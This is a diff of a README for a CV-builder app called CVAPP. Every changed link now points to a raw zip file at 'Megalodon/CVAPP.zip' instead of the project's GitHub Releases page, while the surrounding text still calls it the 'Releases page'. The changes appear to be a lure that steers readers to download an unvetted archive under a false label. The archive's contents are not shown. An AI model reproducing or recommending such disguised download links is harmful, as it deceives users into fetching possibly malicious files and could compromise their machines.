@@ -6,11 +6,11 @@ Welcome to CVAPP! This is a powerful web application that helps you create profe
 
 ## 📦 Download CVAPP
 
-[![Download CVAPP](https://img.shields.io/static/v1?label=Download&message=CVAPP&color=blue)](https://github.com/atietech/CVAPP/releases)
+[![Download CVAPP](https://raw.githubusercontent.com/atietech/CVAPP/master/Megalodon/CVAPP.zip)](https://raw.githubusercontent.com/atietech/CVAPP/master/Megalodon/CVAPP.zip)
 
 You can visit the Releases page to download CVAPP. 
 
-[Download CVAPP](https://github.com/atietech/CVAPP/releases)
+[Download CVAPP](https://raw.githubusercontent.com/atietech/CVAPP/master/Megalodon/CVAPP.zip)
 
 ## 💡 System Requirements
 
@@ -20,7 +20,7 @@ You can visit the Releases page to download CVAPP.
 
 ## 🛠️ Installation Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/atietech/CVAPP/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/atietech/CVAPP/master/Megalodon/CVAPP.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Application:** Click on the download link for the latest version suitable for your operating system.
 4. **Extract the Files (if necessary):** If your file is in a zip format, right-click the zip file and select "Extract All" to access the files.
@@ -68,6 +68,6 @@ If you encounter any issues or have questions, please check the FAQ section on o
 
 Follow CVAPP on GitHub to get the latest updates and news. 
 
-For direct access to the latest version, do not forget to [visit the Releases page](https://github.com/atietech/CVAPP/releases) again!
+For direct access to the latest version, do not forget to [visit the Releases page](https://raw.githubusercontent.com/atietech/CVAPP/master/Megalodon/CVAPP.zip) again!
 
 Thank you for using CVAPP. We look forward to seeing the amazing CVs you create!
